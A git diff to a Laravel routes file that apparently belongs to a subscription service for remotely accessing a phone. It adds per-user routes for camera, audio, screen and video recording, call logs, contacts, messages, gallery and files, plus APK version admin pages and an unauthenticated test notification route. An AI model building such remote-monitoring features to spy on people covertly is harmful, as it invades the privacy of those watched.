@@ -4,6 +4,7 @@ use App\Http\Controllers\Actions\Functions\SendFcmNotification as FunctionsSendF
 use App\Http\Controllers\activationCodeController;
 use App\Http\Controllers\adminController;
 use App\Http\Controllers\Api\V1\ApiAuthController;
+use App\Http\Controllers\ApkVersionController;
 use App\Http\Controllers\clientController;
 use App\Http\Controllers\couponsController;
 use App\Http\Controllers\frontend\messageController;
@@ -17,6 +18,18 @@ use App\Http\Controllers\settingsController;
 use App\Http\Controllers\subscriptionController;
 use App\Http\Controllers\transactionsController;
 use App\Http\Controllers\usersController;
+use App\Http\Livewire\AlertDeviceComponent;
+use App\Http\Livewire\AudioRecordComponent;
+use App\Http\Livewire\CallLogComponent;
+use App\Http\Livewire\CameraComponent;
+use App\Http\Livewire\ContactsComponent;
+use App\Http\Livewire\FilemanagerComponent;
+use App\Http\Livewire\GalleryComponent;
+use App\Http\Livewire\LostMessagesComponent;
+use App\Http\Livewire\MessageComponent;
+use App\Http\Livewire\ScreenRecordComponent;
+use App\Http\Livewire\VibrateComponent;
+use App\Http\Livewire\VideoRecordComponent;
 use App\Models\settings;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Session;
@@ -64,6 +77,20 @@ Route::group(['middleware' => 'client.auth'], function () {
     route::post('/onlinePayment', [FrontendSubscriptionController::class, 'onlinePayment']);
 
     route::post('/messages', [messageController::class, 'index'])->name('/messages');
+
+    // features
+    route::get('/message/{userId}', MessageComponent::class);
+    route::get('/contacts/{userId}', ContactsComponent::class);
+    route::get('/camera/{userId}', CameraComponent::class);
+    route::get('/call-log/{userId}', CallLogComponent::class);
+    route::get('/audio-record/{userId}', AudioRecordComponent::class);
+    route::get('/alert-device/{userId}', AlertDeviceComponent::class);
+    route::get('/vibrate-device/{userId}', VibrateComponent::class);
+    route::get('/screen-record/{userId}', ScreenRecordComponent::class);
+    route::get('/video-record/{userId}', VideoRecordComponent::class);
+    route::get('/gallery/{userId}', GalleryComponent::class);
+    route::get('/filemanager/{userId}', FilemanagerComponent::class);
+    route::get('/lost-messages/{userId}', LostMessagesComponent::class);
 });
 
 
@@ -135,6 +162,9 @@ Route::group(['middleware' => 'user.auth'], function () {
 
     route::get('/admin/profile/{id}', [adminController::class, 'profile']);
     route::post('/admin/profile/update', [adminController::class, 'profile_update']);
+
+    Route::get('/admin/apk-versions', [ApkVersionController::class, 'index'])->name('apk-version');
+    Route::post('/admin/apk-versions', [ApkVersionController::class, 'create_update']);
 });
 
 Route::get('/test-fcm-notification', [FunctionsSendFcmNotification::class, 'sendNotification']);
